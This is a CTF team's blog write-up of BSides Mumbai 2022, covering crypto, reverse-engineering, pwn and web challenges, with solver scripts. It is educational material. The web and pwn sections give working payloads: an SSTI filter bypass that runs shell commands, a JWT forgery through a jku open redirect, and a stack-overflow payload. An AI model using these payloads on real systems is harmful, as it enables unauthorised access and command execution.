<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Bsides Mumbai 2022 Writeup | Black Bauhinia</title>

<meta name="keywords" content="ctf" />
<meta name="description" content="We played TSJ CTF last weekend and we won! This is the writeups of our challenges">
<meta name="author" content="cire meat pop, fsharp, grhkm, Hollow, Ja5on, LifeIsHard, Kaiziron, Mystiz, TWY">
<link rel="canonical" href="https://b6a.black/posts/2022-12-14-bsides-mumbai/" />
<link href="/assets/css/stylesheet.min.79c4dfee3993cd3110886e38d36a5106e0d6922344cefa3ff5c0076f246815f0.css" integrity="sha256-ecTf7jmTzTEQiG4402pRBuDWkiNEzvo/9cAHbyRoFfA=" rel="preload stylesheet"
    as="style">

<link rel="icon" href="https://b6a.black/favicon.ico">

<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.91.0" />




<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-M67YZZ2MP1');
</script>



<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>


<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Recursive&display=swap" rel="stylesheet"> 


<meta property="og:title" content="Bsides Mumbai 2022 Writeup" />
<meta property="og:description" content="We played TSJ CTF last weekend and we won! This is the writeups of our challenges" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://b6a.black/posts/2022-12-14-bsides-mumbai/" />
<meta property="og:image" content="https://b6a.black/images/2022-12-14-bsides-mumbai/scoreboard.png" /><meta property="article:published_time" content="2022-12-14T19:00:00+08:00" />
<meta property="article:modified_time" content="2022-12-14T19:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://b6a.black/images/2022-12-14-bsides-mumbai/scoreboard.png" />
<meta name="twitter:title" content="Bsides Mumbai 2022 Writeup"/>
<meta name="twitter:description" content="We played TSJ CTF last weekend and we won! This is the writeups of our challenges"/>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Bsides Mumbai 2022 Writeup",
  "name": "Bsides Mumbai 2022 Writeup",
  "description": "We played TSJ CTF last weekend and we won! This is the writeups of our challenges",
  "keywords": [
    "ctf"
  ],
  "articleBody": "Crypto Poet Xor Solved by Mystiz and LifeIsHard\n XOR was a famous poet of 1931. Please help him recover his poem. Read his poem and you’ll get your reward in the the last line.\n From the description, we can guess that the flag is in the last line. Therefore, the first 9 characters of the last line would be BSMumbai{.\nFrom the source code, the 8-bytes key wee is re-used to encrypt the whole message (can see from the part with itertools.cycle).\nwee = token_bytes(8) cipher = '' for secret in FLAG: enc = bytes([ a ^ b for a,b in zip(secret, cycle(wee)) ]) cipher += enc.hex() + '\\n' We can recover the key by XOR(\"BSMumbai\", first 8 bytes in the last line), and the recovered key is e3245defe0693bd5 in hex.\nLastly, we can use this key to decrypt the whole message.\nfrom pwn import * from itertools import cycle enc_flag = [] for each in open(\"flag.enc\", \"rb\").read().strip().split(b'\\n'): chg_to_bytes = bytes.fromhex(each.decode()) enc_flag.append(chg_to_bytes) key = xor(b'BSMumbai', enc_flag[-1][0:8]) for each in enc_flag: dec = bytes([a^b for a,b in zip(each, cycle(key))]) print(dec.decode()) Message Two bits meet, each with its own One zero, one one, they are shown Together they combine, with a XOR A new value is formed, never a bore. BSMumbai{w0w_1t_1s_4_fl4g_1n_th3_3nd} Big RSA Solved by fsharp\nIn this challenge, the keygen function is vulnerable because d generated is too small (only 256 bits long).\ndef keygen(nbit): p, q = [ getPrime(nbit) for _ in range(2)] n = p * q phi = (p-1)*(q-1) d = getPrime(1  8) e = inverse(d, phi) key = RSA.construct((n,e,d)) return key By using Boneh-Durfee’s attack on small private key ($d EggLamal Solved by TWY\np = 115078219706537820316093419550008778668298868969654363080518222102779290700853879865170620916229166052063746242902440779410550578694707144210633296690382432644415742679112077458888533507037390392699530015820685944880948493006250673913564751534741449674725051026956477952614364976390284943915858542458481633021 A = 48890218165207275384445272760319358494993711787764906344148899636830485571816493761890964821064860895870242607424457731879309015681135499755293950202646357931855881875967656082276910385046805408731969845166675695997431519571773494534682366571816880592306777375053888105629800076931253497892185033268394556781 B = 115078219706537820316093419550008778668298868969654363080518222102779290700853879865170620916229166052063746242902440779410550578694707144210633296690382432644415742679112077458888533507037390392699530015820685944880948493006250673913564751534741449674725051026956477952614364976390284943915858542458481633020 c = 115078219706537820316093419550008778668298868969654363080518222102779290700853879865170620916229166052063746242902440779410550578694707144210633296690382432644415742679112077458888533507037390392699530015820685944327549289896366601363210341233716225794241970836585781027518436156355332169658951220307457142144 In this challenge, we are given $p$, $A := g^a\\ \\text{mod}\\ p$, $B := g^b\\ \\text{mod}\\ p$. $s$ is computed by $A^b\\ \\text{mod}\\ p$ and we are also given $c := s \\cdot m\\ \\text{mod}\\ p$ for message $m$. Notably $B = p-1$.\nThat would say, $b$ could be $(p-1)/2$. Anyway, this would either make $s = 1$ if $a$ is even or $s = p-1$ otherwise.\nSince $c$ is very close to $p$, it is likely that $s = p-1$. Therefore, $m = -c\\ \\text{mod}\\ p$.\nFlag: BSMumbai{ElGamal_Publickey_Cryptography}.\nECCSub Solved by Mystiz and LifeIsHard\nFrom the source code, every character k in the flag is encrypted with hex(ECC_encode(int(os.urandom(8).hex() + hex(k)[2:], 16)))\n adding 8 random bytes at the front of the character (hex value, in string format) convert it to integer (in base 16) pass the integer to the ECC_encode function convert the returning integer to hex string  def ECC_encode(x): y2 = (x**3 + a*x + b) % p return y2 We need to solve the modular function (p, a, b are given, need to find x), which can be solved with sage:\nC = open('flag.enc', 'r').read().strip() C = [int(char, base=16) for char in eval(C)] for each in C: p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b P.x = PolynomialRing(GF(p)) p = x^3 + a*x + b - each n = p.roots()[-1][0] print(chr(int(hex(n)[-2:],base=16)),end='') Flag: BSMumbai{Substitution_Cipher_With_Elliptic_Curves?}.\nASD-SEA Solved by Mystiz and fsharp\nThe signing algorithm defined for DSA is insecure, in the sense of the random has only two bytes of unknowns.\ndef sign(msg): h = SHA.new(msg).digest() n = bytes_to_long(h + os.urandom(2)) assert 1  n  key.q-1 r = pow(key.g,n,key.p) % key.q s = inverse(n, key.q)*(bytes_to_long(h) + key.x*r) % key.q return s, r In that way, we can brute force for $n$ using $r$ and retrieve the correct $n$. Afterwards, we can use $s$ to obtain the secret key $x$:\nfrom Crypto.Util.Padding import pad, unpad from Crypto.Util.number import * from Crypto.PublicKey import DSA from Crypto.Cipher import AES from Crypto.Hash import SHA s = 14183199055240594428827443533180344323710704440445050743687023631136 r = 5334730754297077906351686352081826499252324846119218024815564201902 ct = long_to_bytes(0x5bfb9c359d2986411837be748915ae0f5a4d5646b2740b8c4b712399a984dd60475dc1b72efb703bee0f87c256cde05e) key = DSA.import_key(open(\"pubkey.pem\", \"rb\").read()) m = open(\"msg.txt\", \"rb\").read() h = SHA.new(m).digest() for i in range(2**16): n = bytes_to_long(h + i.to_bytes(2, \"big\")) if pow(key.g, n, key.p) % key.q == r: break x = ((s * n - bytes_to_long(h)) * inverse(r, key.q)) % key.q aes_key = pad(long_to_bytes(x), 16) cipher = AES.new(aes_key, AES.MODE_ECB) flag = unpad(cipher.decrypt(ct), 16).decode() print(flag) # BSMumbai{DSA_msg_related_nonce_problem} Misc Boot2Root - 1 Solved by Kaiziron\nhttps://github.com/Kaiziron/bsides_mumbai_ctf_2022/blob/main/boot2root1.md\nBoot2Root - 2 Solved by Kaiziron\nhttps://github.com/Kaiziron/bsides_mumbai_ctf_2022/blob/main/boot2root2.md\nPwn warmup Solved by cire meat pop\nObviously, vuln is vulnerable to buffer overflow attack. However, since win function stores the 1st and 2nd arguments on stack and compare if they are equal to some constant, we can’t directly call win to get flag. To bypass this, we overwrite the return address of vuln to call win+22 such that it only compares the constant with the values on stack which depends on rbp, and the value of rbp can be controlled via buffer overflow attack.\nSolve  Send random words to get the stack address Calculate the address for storing user input by minus a fix offset Crafting the payload: p64(user_input+0x20) + b'\\xba\\x00\\xb0\\x00\\xbe\\xba\\xcc\\x5e' + b'\\x00'*0x10 + p64(user_input) + b'\\x8e' Send the payload to trigger buffer overflow capture flag on screen  Web Useless Forum Solved by Ja5on\n Found admin user from the 2 initial posts Saw graphql query, use GraphQLmap to dump schema there are “getUser” and “getUserV2” mutations, the webapp use “getUserV2” only. Try to use “getUser” mutation to get Admin info and compare the two responses, identified a hidden post with postID “85a270fb-3520-452b-9532-dc198cea99bc” The type comment contain the type post, use mutation “makeComment” to make comment on the hidden post, and request for the post content to get the flag: {\"query\":\"mutation{\\n \\t\\tmakeComment(token:\\\"TOKEN\\\",text:\\\"abc\\\",postID:\\\"85a270fb-3520-452b-9532-dc198cea99bc\\\"){\\n \\t\\t\\tcommentID\\n text\\npost{content}\\n \\t\\t\\t}\\n\\t\\t}\"}  Complaint Box Solved by Ja5on\n random fill in the form, got error message “Does email really need those?, anyway here are the blaclisted keywords ['{{', ‘}}’, ‘.’, ‘_’, ‘0’, ‘1’, ‘2’, ‘3’, ‘4’, ‘5’, ‘6’, ‘7’, ‘8’, ‘9’]” python server + blacklisted keywords ‘{{’, ‘}}’ - SSTI in email field use {% %} bypass the ‘{{’, ‘}}’ filter, payload {% print(config) %} work use |attr to bypass “.”, use request.values for string subsitution. Final payload : name=ab\u0026xx=__class__\u0026xy=__base__\u0026xz=__subclasses__\u0026yy=__getitem__\u0026yz=84\u0026zz=load_module\u0026email={%set+a=request[\"values\"][\"xx\"]%}{%set+b=request[\"values\"][\"xy\"]%}{%set+c=request[\"values\"][\"xz\"]%}{%set+d=request[\"values\"][\"yy\"]%}{%set+e=request[\"values\"][\"yz\"]%}{%set+f=request[\"values\"][\"zz\"]%}{%print([]|attr(a)|attr(b)|attr(c)()|attr(d)(e|int)|attr(f)(\"os\")|attr(\"popen\")(\"cat+flag*\")|attr(\"read\")())%}\u0026subject=ab\u0026message=ab  Bongo Cat Solved by Hollow\n Check cookie, find JWT. Seeing “jku” in header - You can specify the issuer yourself. Noting that the issuer must be from the same host, look for open redirect in the website. There is a endpoint /?redirect_uri=/dashbord. Asserting that it can redirect to external resources. Craft RSA keypair with openssl genrsa -out priv.pem 2048 and openssl rsa -pubout -in priv.pem -out pub.pem Dump n and e from the private key with RsaCtfTool python3 RsaCtfTool.py --key priv.pem --dump Convert n and e into base64-encoded standard with the following code: (Credit: Mystiz)  import base64 n = e = n = int.to_bytes(n, (n.bit_length()+7)//8, 'big') e = int.to_bytes(e, (e.bit_length()+7)//8, 'big') print(base64.urlsafe_b64encode(n)) print(base64.urlsafe_b64encode(e)) Create a file named jwks.json and host it on your server.  {\"kty\":\"RSA\",\"e\":\"\",\"use\":\"sig\",\"alg\":\"RS256\",\"n\":\"\"} Sign the JWT with data {\"user\":\"admin\"} and submit the cookie.  import jwt import requests private_key = open(\"priv.pem\").read().strip() public_key = open(\"pub.pem\").read().strip() encoded = jwt.encode({\"user\":\"admin\"},private_key,algorithm=\"RS256\", headers={\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"http://34.133.45.223/?redirect_uri=https://asdfasdf/jwks.json\" }) r = requests.get(\"http://34.133.45.223/dashboard\", headers={\"Cookie\":f\"token={encoded}\"}) print(r.text) P.S. Thanks for the work that Mystiz has checked that n is secure and is not vulnerable to common factorization attacks.\nReverse Warmup Solved by fsharp\nThe file is the emitted LLVM IR of a C program for checking a password. The program could be summarized as follows:\n#include #include  int main() { char password[100]; printf(\"Enter a string: \"); scanf(\"%s\", \u0026password); if (strlen(password) != 39) exit(0); if ((int)password[28] == 55 \u0026\u0026 (int)password[30] == 110 \u0026\u0026 ... \u0026\u0026 (int)password[20] == 110) printf(\"The flag is correct!\\n\"); else printf(\"The flag is incorrect.\\n\"); return 0; } Save every line from the start of label 10 (10: ... ; preds = %0) to the blank line after the end of label 200 into a file called lines.txt. Then, run the following script to construct the flag:\nwith open(\"lines.txt\", 'r') as f: lines = f.read().splitlines() flag_tuples = [] for i in range(0, len(lines), 7): second_line = lines[i + 1] chr_pos = int(second_line[second_line.rindex(' ') + 1:]) fifth_line = lines[i + 4] chr_val = int(fifth_line[fifth_line.rindex(' ') + 1:]) flag_tuples.append((chr_pos, chr_val)) flag = \"\" for (pos, val) in sorted(flag_tuples): flag += chr(val) print(flag) The flag is BSM{1_f0und_my531f_1n_4_f10471n9_h0u53}.\nonionkopon Solved by Mystiz and fsharp\nWe have a small C program that checks if the password length is a multiple of 8, then encodes each 8-byte block of the password. If these blocks all match 40 given bytes, the password’s correct.\nThe program logic is summarized as follows:\ndef rol(u, n): return ((un) | (u(16-n))) \u0026 0xffff def process_block(pw_block): pw = [int.from_bytes(pw_block[i:i+2], 'little') for i in range(0, 8, 2)] xor_buffer = [0xDEAD, 0xBEEF, 0xCAFE, 0xBABE] for _ in range(16): for i in range(4): pw[(i+1) % 4] = ((pw[i] ^ xor_buffer[i]) + pw[(i+1) % 4]) \u0026 0xffff pw[(i+1) % 4] = rol(pw[(i+1) % 4], 12) return b''.join([int.to_bytes(p, 2, 'little') for p in pw]) correct_pw = b\"...\" encoded = b\"\" assert len(correct_pw) % 8 == 0 for i in range(0, 40, 8): encoded += process_block(correct_pw[i : i + 8]) assert encoded == bytes.fromhex(\"100baacdddd46faa1c0fe0abcbf8fc45e607ac4bedcd1cef29c73102bb971afd6a34a94c7a90ab5c\") We write a function to invert the operations done onto each encoded block to find the flag:\ndef rol(u, n): return ((un) | (u(16-n))) \u0026 0xffff def inverse_process_block(pw_block): pw = [int.from_bytes(pw_block[i:i+2], 'little') for i in range(0, 8, 2)] xor_buffer = [0xDEAD, 0xBEEF, 0xCAFE, 0xBABE] for _ in range(16): for i in [3, 2, 1, 0]: pw[(i+1) % 4] = rol(pw[(i+1) % 4], 4) pw[(i+1) % 4] = (pw[(i+1) % 4] - (pw[i] ^ xor_buffer[i])) \u0026 0xffff return b''.join([int.to_bytes(p, 2, 'little') for p in pw]).decode() encoded = bytes.fromhex(\"100baacdddd46faa1c0fe0abcbf8fc45e607ac4bedcd1cef29c73102bb971afd6a34a94c7a90ab5c\") flag = \"\" for i in range(0, len(encoded), 8): flag += inverse_process_block(encoded[i : i + 8]) print(f\"BSM{{{flag}}}\") The flag is BSM{__4dv32517y_15_7h3_f1257_p47h_70_72u7h__}.\nThe Last One Solved by TWY, grhkm and fsharp\nThe file is a PYC file from Python 3.11. To the best of our knowledge, the current programs that offer functionality for disassembling PYC files or turning them into an equivalent Python script (e.g. decompyle3, uncompyle6, pycdc, pydumpck) do not yet support this version of Python, which was only released around 45 days before the CTF started. So, we instead chose to disassemble the file using Python 3.11.0 directly:\nimport marshal, dis f = open(\"rev5\", \"rb\") _ = f.seek(16) code = marshal.load(f) f.close() print(dis.dis(code)) print(dis.show_code(code)) After reading through the disassembly, the program logic is basically:\nimport sys ror = lambda val, r_bits, max_bits: ((val \u0026 (2 ** max_bits - 1))  (r_bits % max_bits)) | ((val  (max_bits - (r_bits % max_bits)) \u0026 (2 ** max_bits - 1))) qq = (498447548, 3732380986, 1488213715, 2972884408, 3671789619, 1370551614, 1547410907, 3107329395, 299046427, 2038167384, 974344249, 1531985406, 2620489075, 301338675, 1367072094, 1010523443, 1364594739, 1362851550, 3157990840, 3671465363, 4054904883, 1369151198, 3158031800, 3671465299, 833682835, 4049313075, 1369141299, 1362867902, 3694861656, 985013651, 4048590195, 295403003, 2575023507, 4059258195, 832296243, 1364966747, 960197747) def check2(r): r1 = (r \u0026 255) ^ 254 r2 = ((r  8) \u0026 255) ^ 186 r3 = ((r  16) \u0026 255) ^ 202 r4 = ((r  24) \u0026 255) ^ 190 return (r4  24) | (r3  16) | (r2  8) | r1 def check(s): l = [] for i in range(len(s) - 3): r = int.from_bytes(s[i:i + 4], 'little') ^ 3735928559 n = check2(r) l.append(ror(r, 19, 32)) return l str = input('Enter a string: ').encode() if len(str) != 40: sys.exit() m = check(str) for i, j in zip(m, qq): if i != j: print('dasnot it mofo') sys.exit() print('GGWP bro') We wrote the following program to get the flag:\nror = lambda val, r_bits, max_bits: ((val \u0026 (2 ** max_bits - 1))  (r_bits % max_bits)) | ((val  (max_bits - (r_bits % max_bits)) \u0026 (2 ** max_bits - 1))) qq = (498447548, 3732380986, 1488213715, 2972884408, 3671789619, 1370551614, 1547410907, 3107329395, 299046427, 2038167384, 974344249, 1531985406, 2620489075, 301338675, 1367072094, 1010523443, 1364594739, 1362851550, 3157990840, 3671465363, 4054904883, 1369151198, 3158031800, 3671465299, 833682835, 4049313075, 1369141299, 1362867902, 3694861656, 985013651, 4048590195, 295403003, 2575023507, 4059258195, 832296243, 1364966747, 960197747) def check2(r): r1 = (r \u0026 255) ^ 254 r2 = ((r  8) \u0026 255) ^ 186 r3 = ((r  16) \u0026 255) ^ 202 r4 = ((r  24) \u0026 255) ^ 190 return (r4  24) | (r3  16) | (r2  8) | r1 def check_rev(r): return bytes.fromhex(hex(ror(r, 32 - 19, 32) ^ 3735928559)[2:].zfill(8))[::-1] qq_rev = [check_rev(x) for x in qq] print((b\"\".join([a[0:1] for a in qq_rev[:-1]]) + qq_rev[-1]).decode()) The flag is BSM{7h3_w0und_15_47_h32_h3427_k42u124w4}.\nPiano Solved by fsharp\nWe’re given a Rust binary that checks if the entered password is 65 characters long, then subjects each character in the password to a series of bit shifts and XORs. The password’s correct if these characters all match 65 given bytes. Given how safe Rust is by default, only a very small portion of the disassembled program is relevant, and the rest is mostly for dealing with errors like integer overflows.\nThe program logic is roughly as follows in Python:\nimport sys pw = bytearray(input(\"Enter something:\\n\").encode()) encoded = bytes.fromhex(\"66cf77b25360f45e8ba8426aa77217d7fce8f2c4e427120ccf5d857a68d7b5c8570f59588d14896abea468dbf3d0a00fe03b8ba9ca8ddebd138338e0624ff8109a\") if len(pw) != 65: print(\"Hmmm...\") sys.exit() for i in range(len(pw)): c = pw[i] shift_amount = i % 7 if (i % 2) == 0: shifted = ((c  shift_amount) | (c  (8 - shift_amount))) % 256 shifted ^= 0x24 else: shifted = ((c  shift_amount) | (c  (8 - shift_amount))) % 256 shifted ^= 0x69 pw[i] = shifted if pw == encoded: print(\"Good Job ^^\") Rather than going through the tedium of undoing the XORs and bit shifts, a small Python program is written to bruteforce each character as follows:\nencoded = bytes.fromhex(\"66cf77b25360f45e8ba8426aa77217d7fce8f2c4e427120ccf5d857a68d7b5c8570f59588d14896abea468dbf3d0a00fe03b8ba9ca8ddebd138338e0624ff8109a\") flag = \"\" for i in range(len(encoded)): for c in range(32, 127): shift_amount = i % 7 if (i % 2) == 0: shifted = ((c  shift_amount) | (c  (8 - shift_amount))) % 256 shifted ^= 0x24 else: shifted = ((c  shift_amount) | (c  (8 - shift_amount))) % 256 shifted ^= 0x69 if shifted == encoded[i]: flag += chr(c) break print(flag) The flag is BSM{wH47_p30pl3_c0mm0NlY_C4LL_F473_1S_m0S7LY_7H31R_0wN_S7up1d17y}.\n",
  "wordCount" : "2298",
  "inLanguage": "en",
  "image":"https://b6a.black/images/2022-12-14-bsides-mumbai/scoreboard.png","datePublished": "2022-12-14T19:00:00+08:00",
  "dateModified": "2022-12-14T19:00:00+08:00",
  "author":[{
    "@type": "Person",
    "name": "cire meat pop"
  }, {
    "@type": "Person",
    "name": "fsharp"
  }, {
    "@type": "Person",
    "name": "grhkm"
  }, {
    "@type": "Person",
    "name": "Hollow"
  }, {
    "@type": "Person",
    "name": "Ja5on"
  }, {
    "@type": "Person",
    "name": "LifeIsHard"
  }, {
    "@type": "Person",
    "name": "Kaiziron"
  }, {
    "@type": "Person",
    "name": "Mystiz"
  }, {
    "@type": "Person",
    "name": "TWY"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://b6a.black/posts/2022-12-14-bsides-mumbai/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Black Bauhinia",
    "logo": {
      "@type": "ImageObject",
      "url": "https://b6a.black/favicon.ico"
    }
  }
}
</script>



</head>

<body class=" dark" id="top">
<noscript>
    <style type="text/css">
        .theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
            <span class="logo-switches">
                
                
            </span>
        </div>
        <ul id="menu" onscroll="menu_on_scroll()">
            <li>
                <a href="https://b6a.black/about-us/" title="About Us">
                    <span>About Us</span>
                </a>
            </li></ul>
    </nav>
</header>

    <main class="main">

<article class="post-single">
  <header class="post-header">

    <h1 class="post-title">
      Bsides Mumbai 2022 Writeup
    </h1>
    <div class="post-meta">

December 14, 2022&nbsp;·&nbsp;cire meat pop, fsharp, grhkm, Hollow, Ja5on, LifeIsHard, Kaiziron, Mystiz, TWY

</div>
  </header>
  
  
  <div class="post-content js-toc-content">
<h2 id="crypto">Crypto<a hidden class="anchor" aria-hidden="true" href="#crypto">#</a></h2>
<h3 id="poet-xor">Poet Xor<a hidden class="anchor" aria-hidden="true" href="#poet-xor">#</a></h3>
<p><em>Solved by Mystiz and LifeIsHard</em></p>
<blockquote>
<p>XOR was a famous poet of 1931. Please help him recover his poem. Read his poem and you&rsquo;ll get your reward in the the last line.</p>
</blockquote>
<p>From the description, we can guess that the flag is in the last line. Therefore, the first 9 characters of the last line would be <code>BSMumbai{</code>.</p>
<p>From the source code, the 8-bytes key <code>wee</code> is re-used to encrypt the whole message (can see from the part with <code>itertools.cycle</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">wee <span style="color:#f92672">=</span> token_bytes(<span style="color:#ae81ff">8</span>)
cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>

<span style="color:#66d9ef">for</span> secret <span style="color:#f92672">in</span> FLAG:
    enc <span style="color:#f92672">=</span> bytes([ a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a,b <span style="color:#f92672">in</span> zip(secret, cycle(wee)) ])
    cipher <span style="color:#f92672">+=</span> enc<span style="color:#f92672">.</span>hex() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</code></pre></div><p>We can recover the key by <code>XOR(&quot;BSMumbai&quot;, first 8 bytes in the last line)</code>, and the recovered key is <code>e3245defe0693bd5</code> in hex.</p>
<p>Lastly, we can use this key to decrypt the whole message.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> cycle

enc_flag <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> each <span style="color:#f92672">in</span> open(<span style="color:#e6db74">&#34;flag.enc&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>):
    chg_to_bytes <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(each<span style="color:#f92672">.</span>decode())
    enc_flag<span style="color:#f92672">.</span>append(chg_to_bytes)
    
key <span style="color:#f92672">=</span> xor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BSMumbai&#39;</span>, enc_flag[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">8</span>])

<span style="color:#66d9ef">for</span> each <span style="color:#f92672">in</span> enc_flag:
    dec <span style="color:#f92672">=</span> bytes([a<span style="color:#f92672">^</span>b <span style="color:#66d9ef">for</span> a,b <span style="color:#f92672">in</span> zip(each, cycle(key))])
    print(dec<span style="color:#f92672">.</span>decode())
</code></pre></div><h4 id="message">Message<a hidden class="anchor" aria-hidden="true" href="#message">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Two bits meet, each with its own
One zero, one one, they are shown
Together they combine, with a XOR
A new value is formed, never a bore.
BSMumbai{w0w_1t_1s_4_fl4g_1n_th3_3nd}
</code></pre></div><h3 id="big-rsa">Big RSA<a hidden class="anchor" aria-hidden="true" href="#big-rsa">#</a></h3>
<p><em>Solved by fsharp</em></p>
<p>In this challenge, the <code>keygen</code> function is vulnerable because <code>d</code> generated is too small (only 256 bits long).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">keygen</span>(nbit):
    p, q <span style="color:#f92672">=</span> [ getPrime(nbit) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>)]
    n <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q
    phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
    d <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>)
    e <span style="color:#f92672">=</span> inverse(d, phi)
    key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>construct((n,e,d))
    <span style="color:#66d9ef">return</span> key
</code></pre></div><p>By using Boneh-Durfee&rsquo;s attack on small private key ($d &lt; n^{0.292}$), we can effectively recover $d$ and thus decrypt the flag.</p>
<h3 id="egglamal">EggLamal<a hidden class="anchor" aria-hidden="true" href="#egglamal">#</a></h3>
<p><em>Solved by TWY</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> <span style="color:#ae81ff">115078219706537820316093419550008778668298868969654363080518222102779290700853879865170620916229166052063746242902440779410550578694707144210633296690382432644415742679112077458888533507037390392699530015820685944880948493006250673913564751534741449674725051026956477952614364976390284943915858542458481633021</span>
A <span style="color:#f92672">=</span> <span style="color:#ae81ff">48890218165207275384445272760319358494993711787764906344148899636830485571816493761890964821064860895870242607424457731879309015681135499755293950202646357931855881875967656082276910385046805408731969845166675695997431519571773494534682366571816880592306777375053888105629800076931253497892185033268394556781</span>
B <span style="color:#f92672">=</span> <span style="color:#ae81ff">115078219706537820316093419550008778668298868969654363080518222102779290700853879865170620916229166052063746242902440779410550578694707144210633296690382432644415742679112077458888533507037390392699530015820685944880948493006250673913564751534741449674725051026956477952614364976390284943915858542458481633020</span>
c <span style="color:#f92672">=</span> <span style="color:#ae81ff">115078219706537820316093419550008778668298868969654363080518222102779290700853879865170620916229166052063746242902440779410550578694707144210633296690382432644415742679112077458888533507037390392699530015820685944327549289896366601363210341233716225794241970836585781027518436156355332169658951220307457142144</span>
</code></pre></div><p>In this challenge, we are given $p$, $A := g^a\ \text{mod}\ p$, $B := g^b\ \text{mod}\ p$. $s$ is computed by $A^b\ \text{mod}\ p$ and we are also given $c := s \cdot m\ \text{mod}\ p$ for message $m$. Notably $B = p-1$.</p>
<p>That would say, $b$ could be $(p-1)/2$. Anyway, this would either make $s = 1$ if $a$ is even or $s = p-1$ otherwise.</p>
<p>Since $c$ is very close to $p$, it is likely that $s = p-1$. Therefore, $m = -c\ \text{mod}\ p$.</p>
<p>Flag: <code>BSMumbai{ElGamal_Publickey_Cryptography}</code>.</p>
<h3 id="eccsub">ECCSub<a hidden class="anchor" aria-hidden="true" href="#eccsub">#</a></h3>
<p><em>Solved by Mystiz and LifeIsHard</em></p>
<p>From the source code, every character <code>k</code> in the flag is encrypted with
<code>hex(ECC_encode(int(os.urandom(8).hex() + hex(k)[2:], 16)))</code></p>
<ul>
<li>adding 8 random bytes at the front of the character (hex value, in string format)</li>
<li>convert it to integer (in base 16)</li>
<li>pass the integer to the <code>ECC_encode</code> function</li>
<li>convert the returning integer to hex string</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ECC_encode</span>(x):
    y2 <span style="color:#f92672">=</span> (x<span style="color:#f92672">**</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> a<span style="color:#f92672">*</span>x <span style="color:#f92672">+</span> b) <span style="color:#f92672">%</span> p
    <span style="color:#66d9ef">return</span> y2
</code></pre></div><p>We need to solve the modular function (<code>p</code>, <code>a</code>, <code>b</code> are given, need to find <code>x</code>), which can be solved with sage:</p>
